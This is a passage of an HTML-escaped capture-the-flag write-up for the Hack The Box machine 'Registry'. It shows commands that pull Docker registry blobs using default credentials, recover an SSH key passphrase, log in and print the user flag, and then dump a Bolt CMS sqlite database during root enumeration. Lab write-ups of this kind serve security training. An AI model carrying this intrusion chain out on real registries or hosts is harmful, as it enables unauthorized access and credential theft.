+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:04.936777709Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo &amp;#39;docker&amp;#39; \\u003e /run/systemd/container\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:04.220422684Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c rm -rf /var/lib/apt/lists/*\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\&amp;quot;,\&amp;quot;parent\&amp;quot;:\&amp;quot;f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:03.471632173Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo &amp;#39;#!/bin/sh&amp;#39; \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo &amp;#39;exit 101&amp;#39; \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i &amp;#39;s/^exit.*/exit 0/&amp;#39; /sbin/initctl \\t\\t\\u0026\\u0026 echo &amp;#39;force-unsafe-io&amp;#39; \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo &amp;#39;DPkg::Post-Invoke { \\\&amp;quot;rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\&amp;quot;; };&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo &amp;#39;APT::Update::Post-Invoke { \\\&amp;quot;rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\&amp;quot;; };&amp;#39; \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo &amp;#39;Dir::Cache::pkgcache \\\&amp;quot;\\\&amp;quot;; Dir::Cache::srcpkgcache \\\&amp;quot;\\\&amp;quot;;&amp;#39; \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo &amp;#39;Acquire::Languages \\\&amp;quot;none\\\&amp;quot;;&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo &amp;#39;Acquire::GzipIndexes \\\&amp;quot;true\\\&amp;quot;; Acquire::CompressionTypes::Order:: \\\&amp;quot;gz\\\&amp;quot;;&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo &amp;#39;Apt::AutoRemove::SuggestsImportant \\\&amp;quot;false\\\&amp;quot;;&amp;#39; \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      },&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;v1Compatibility&amp;quot;: &amp;quot;{\&amp;quot;id\&amp;quot;:\&amp;quot;f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\&amp;quot;,\&amp;quot;created\&amp;quot;:\&amp;quot;2019-04-26T22:21:02.724843678Z\&amp;quot;,\&amp;quot;container_config\&amp;quot;:{\&amp;quot;Cmd\&amp;quot;:[\&amp;quot;/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \&amp;quot;]}}&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      }&lt;/span&gt;
+&lt;span class="code-line"&gt;  ],&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;quot;signatures&amp;quot;: [&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;header&amp;quot;: {&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;quot;jwk&amp;quot;: {&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;quot;crv&amp;quot;: &amp;quot;P-256&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;quot;kid&amp;quot;: &amp;quot;Q25C:2A2S:CDXB:7IXF:ZKDR:DELT:QBCW:XKT5:OT7Z:GQBN:4PG4:UK6K&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;quot;kty&amp;quot;: &amp;quot;EC&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;quot;x&amp;quot;: &amp;quot;WSj-L3I1ssgS0RChWY0rTb1-N3dZjGpHfwKmvulklM0&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;              &amp;quot;y&amp;quot;: &amp;quot;SUmHvK1PcIZzBkzk34Nn8mzXq2veOpDlECUqVsru3k8&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;            },&lt;/span&gt;
+&lt;span class="code-line"&gt;            &amp;quot;alg&amp;quot;: &amp;quot;ES256&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;        },&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;signature&amp;quot;: &amp;quot;W1F9OyNxfyFaljdYUFMnVbcwUIgaJ7wiwfe1JboyRBFsYZGmzWC0n0bkQbGXD7M9P2Bh-D3U0u0AG3zWxEndLg&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;protected&amp;quot;: &amp;quot;eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAxOS0xMi0wM1QxNDowODoyOFoifQ&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      }&lt;/span&gt;
+&lt;span class="code-line"&gt;  ]&lt;/span&gt;
+&lt;span class="code-line"&gt;}&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3 id="blobs"&gt;Blobs&lt;/h3&gt;
+&lt;p&gt;We extract the list of blobs and redirect it to a file
+&lt;code&gt;grep blob latest | cut -d '"' -f 4 &amp;gt; blob_list&lt;/code&gt; then we download each blob
+&lt;code&gt;while read l ; do wget --http-user=admin --http-password=admin
+--no-check-certificate https://docker.registry.htb/v2/bolt-image/blobs/$l; done
+&amp;lt; blob_list&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The blob
+&lt;code&gt;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&lt;/code&gt; only
+contain a file edited with Vim 8 (there is a vulnerability for this version). But
+we do not have access to a Vim for the moment.&lt;/p&gt;
+&lt;p&gt;In the &lt;code&gt;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&lt;/code&gt;
+blob we found a &lt;code&gt;01-ssh.sh&lt;/code&gt; file containing a password&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;#!/usr/bin/expect -f&lt;/span&gt;
+&lt;span class="code-line"&gt;#eval `ssh-agent -s`&lt;/span&gt;
+&lt;span class="code-line"&gt;spawn ssh-add /root/.ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;expect &amp;quot;Enter passphrase for /root/.ssh/id_rsa:&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;send &amp;quot;GkOcz221Ftb3ugog\n&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;expect &amp;quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;interact&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the blob
+&lt;code&gt;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&lt;/code&gt; we
+found a &lt;code&gt;.bash_history&lt;/code&gt; file not containing something interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cd /root/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;.bash_history&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .bashrc&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;l .ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .viminfo&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt; .viminfo&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The blob
+&lt;code&gt;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&lt;/code&gt;
+contain a few files but nothing of interest.
+The blob &lt;code&gt;` contain a&lt;/code&gt;.bash_history` file.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;s aux&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;apt update&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install git&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install php&lt;/span&gt;
+&lt;span class="code-line"&gt;php --ini |grep Loaded&lt;/span&gt;
+&lt;span class="code-line"&gt;l /etc/php/&lt;/span&gt;
+&lt;span class="code-line"&gt;l /etc/php/7.2/&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install nginx&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install php-fpm&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /var/www/html/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;rm -rf index.html&lt;/span&gt;
+&lt;span class="code-line"&gt;mv index.nginx-debian.html index.html&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;git clone https://github.com/bolt/bolt.git&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cd bolt/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;useradd -m bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /home/&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;userdel bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;rm -rf bolt/&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /root/&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;mkdir .ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;cd .ssh/&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;vi config&lt;/span&gt;
+&lt;span class="code-line"&gt;edit config&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install vim&lt;/span&gt;
+&lt;span class="code-line"&gt;vi config&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh-keygen -t rsa -b 4096 -C &amp;quot;bolt@registry.htb&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cd ..&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh-add /root/.ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;eval `ssh-agent -s`&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh-add /root/.ssh/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux | grep ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;l /etc/profile.d/&lt;/span&gt;
+&lt;span class="code-line"&gt;l /etc/profile.d/01-locale-fix.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/profile.d/01-locale-fix.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/profile&lt;/span&gt;
+&lt;span class="code-line"&gt;l /etc/bash.bashrc&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/bash.bashrc&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;wd&lt;/span&gt;
+&lt;span class="code-line"&gt;pwd&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .bashrc&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install expect&lt;/span&gt;
+&lt;span class="code-line"&gt;which expect&lt;/span&gt;
+&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;l /etc/profile.d/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la /etc/profile.d/&lt;/span&gt;
+&lt;span class="code-line"&gt;sh /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;which spawn&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install spawn&lt;/span&gt;
+&lt;span class="code-line"&gt;chmod +x /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;vi /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh registry&lt;/span&gt;
+&lt;span class="code-line"&gt;ping registry.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install ping&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install iputils-ping&lt;/span&gt;
+&lt;span class="code-line"&gt;ping registry.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .ssh/id_rsa.pub&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh registry&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /etc/profile.d/&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;cp 01-ssh.sh 02-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;vi 01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh 01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;chmod +x 01-&lt;/span&gt;
+&lt;span class="code-line"&gt;chmod +x 01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;./01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;kill 11162 11241 11365&lt;/span&gt;
+&lt;span class="code-line"&gt;ssh registry&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/profile&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /root/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cat .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;vi .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;vi .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;eval `ssh-agent -s`&lt;/span&gt;
+&lt;span class="code-line"&gt;vi .profile&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;systemctl restart nginx.service&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/init.d/nginx start&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/init.d/php7.2-fpm start&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /var/www/html/&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;vi sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;chmod +x sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;apt install rsync&lt;/span&gt;
+&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/profile.d/01-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;/etc/profile.d/02-ssh.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;rm -rf bolt/&lt;/span&gt;
+&lt;span class="code-line"&gt;./sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cd bolt/&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cd ..&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;rm -rf bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cat sync.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;kill 11412 11531&lt;/span&gt;
+&lt;span class="code-line"&gt;ps aux&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /home/&lt;/span&gt;
+&lt;span class="code-line"&gt;l&lt;/span&gt;
+&lt;span class="code-line"&gt;ls -la&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;exit&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The blob
+&lt;code&gt;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&lt;/code&gt;
+doesn't seems to contain anything.&lt;/p&gt;
+&lt;p&gt;The blob
+&lt;code&gt;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&lt;/code&gt;
+contain some &lt;code&gt;apt&lt;/code&gt; list.&lt;/p&gt;
+&lt;p&gt;The blob
+&lt;code&gt;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&lt;/code&gt;
+contain a full file system. But no passwords in &lt;code&gt;/etc/shadow&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The blob
+&lt;code&gt;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&lt;/code&gt; does
+not contain anything interesting.&lt;/p&gt;
+&lt;p&gt;The blob
+&lt;code&gt;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&lt;/code&gt; is
+quit big there is a full file system in it. In the &lt;code&gt;/root/.ssh/&lt;/code&gt; folder we find
+another SSH key and a SSH config file (the &lt;code&gt;/etc/shadow&lt;/code&gt; doesn't contain any
+password).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Host registry&lt;/span&gt;
+&lt;span class="code-line"&gt;  User bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;  Port 22&lt;/span&gt;
+&lt;span class="code-line"&gt;  Hostname registry.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The SSH key let us connect as bolt on the box.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# ssh 10.10.10.159 -l bolt -i blobs/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;blobs/id_rsa&amp;#39;:&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;System information disabled due to load higher than 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Tue Dec  3 13:48:57 2019 from 10.10.15.222&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:~$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt@bolt:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;ytc0ytdmnzywnzgxngi0zte0otm3ywzi&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;We start our enumeration.&lt;/p&gt;
+&lt;p&gt;In &lt;code&gt;/var/www/html/&lt;/code&gt; we found a PHP script used for backup. This script call the
+&lt;code&gt;restic&lt;/code&gt; binary with the &lt;code&gt;sudo&lt;/code&gt; rights.
+As this is a script the user running it probably don't need to input a
+password. As this is in &lt;code&gt;/var/www/html/&lt;/code&gt; this is probably run by the &lt;code&gt;www-data&lt;/code&gt;
+user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /var/www/html/backup.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?php shell_exec(&amp;quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="bolt-archive"&gt;Bolt archive&lt;/h2&gt;
+&lt;p&gt;We also found a backup archive on the system &lt;code&gt;/var/backup/blot.tgz&lt;/code&gt;. We &lt;code&gt;scp&lt;/code&gt; it on our
+box and decompress it. This is a clone of https://github.com/bolt/bolt on the
+branch &lt;code&gt;3.6&lt;/code&gt;. We can check that the commit match with &lt;code&gt;tig&lt;/code&gt; and the &lt;a href="https://github.com/bolt/bolt/commit/a3bbe38afcc591e37ded6d0efe47bb197ae63687"&gt;github
+repository&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="tig" src="/media/2020.04/registry_2.png"&gt;&lt;/p&gt;
+&lt;p&gt;A &lt;code&gt;git status&lt;/code&gt; inform us that nothing was modify (from &lt;code&gt;git&lt;/code&gt; point of view).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git status&lt;/span&gt;
+&lt;span class="code-line"&gt;On branch 3.6&lt;/span&gt;
+&lt;span class="code-line"&gt;Your branch is up to date with &amp;#39;origin/3.6&amp;#39;.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;nothing to commit, working tree clean&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So we look at the files listed in &lt;code&gt;.gitignore&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id="appconfig"&gt;app/config&lt;/h3&gt;
+&lt;p&gt;The file &lt;code&gt;config.yml&lt;/code&gt; tell us that there is sqlite database named bolt. The
+other files does not contain useful information.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;head app/config/config.yml&lt;/span&gt;
+&lt;span class="code-line"&gt;# Database setup. The driver can be either &amp;#39;sqlite&amp;#39;, &amp;#39;mysql&amp;#39; or &amp;#39;postgres&amp;#39;.&lt;/span&gt;
+&lt;span class="code-line"&gt;#&lt;/span&gt;
+&lt;span class="code-line"&gt;# For SQLite, only the databasename is required. However, MySQL and PostgreSQL&lt;/span&gt;
+&lt;span class="code-line"&gt;# also require &amp;#39;username&amp;#39;, &amp;#39;password&amp;#39;, and optionally &amp;#39;host&amp;#39; ( and &amp;#39;port&amp;#39; ) if the database&lt;/span&gt;
+&lt;span class="code-line"&gt;# server is not on the same host as the web server.&lt;/span&gt;
+&lt;span class="code-line"&gt;#&lt;/span&gt;
+&lt;span class="code-line"&gt;# If you&amp;#39;re trying out Bolt, just keep it set to SQLite for now.&lt;/span&gt;
+&lt;span class="code-line"&gt;database:&lt;/span&gt;
+&lt;span class="code-line"&gt;    driver: sqlite&lt;/span&gt;
+&lt;span class="code-line"&gt;    databasename: bolt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3 id="appdatabase"&gt;app/database&lt;/h3&gt;
+&lt;p&gt;We can access the database using &lt;code&gt;sqlite3&lt;/code&gt; (which is available by default on a
+Kali install). We list the available tables and the data from the &lt;code&gt;bolt_users&lt;/code&gt;
+and &lt;code&gt;bolt_authtoken&lt;/code&gt;. We got a password hash.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sqlite3 app/database/bolt.db&lt;/span&gt;
+&lt;span class="code-line"&gt;SQLite version 3.30.1 2019-10-10 20:19:45&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
+&lt;span class="code-line"&gt;sqlite&amp;gt; .tables&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt_authtoken    bolt_field_value  bolt_pages        bolt_users&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt_blocks       bolt_homepage     bolt_relations&lt;/span&gt;
+&lt;span class="code-line"&gt;bolt_cron         bolt_log_change   bolt_showcases&lt;/span&gt;
